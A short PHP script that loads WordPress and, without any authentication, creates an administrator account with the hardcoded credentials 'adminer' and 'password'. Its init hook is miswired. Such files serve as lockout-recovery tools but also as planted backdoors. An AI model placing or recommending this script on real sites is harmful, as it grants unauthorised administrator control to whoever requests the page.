<?php

$wp_folder = '';
$username = 'adminer';
$password = 'password';
$email = 'mail@example.com';

if(!empty($wp_folder)) {
  $wp_load_path = $wp_folder .'/wp-load.php';
} else {
  $wp_load_path = 'wp-load.php';
}

// Verify if wp-load.php is exist

if (!file_exists($wp_load_path)) {
    echo "ERROR! wp-load.php does not exist!";
    echo '<br>';
    exit;
}

//execute the function to create the admin user
create_wp_admin_user($username, $password, $email, $wp_load_path);
 
function create_wp_admin_user($username, $password, $email, $wp_load_path) {
 
   //link this script into wordpress
   include($wp_load_path);
  
   if (!username_exists($username)) {
     $user_id = wp_create_user($username, $password, $email);
     $user = new WP_User($user_id);
     $user->set_role('administrator');
     header("Location: wp-login.php/");
 
         echo 'User '.$username.' is successfully created!';
         echo '<br>';
         
   } else {
 
         echo 'ERROR! - ' . $username . ' already exists!';
         echo '<br>';
         exit;
 
   }
 
}

add_action('init','create_wp_admin_user');
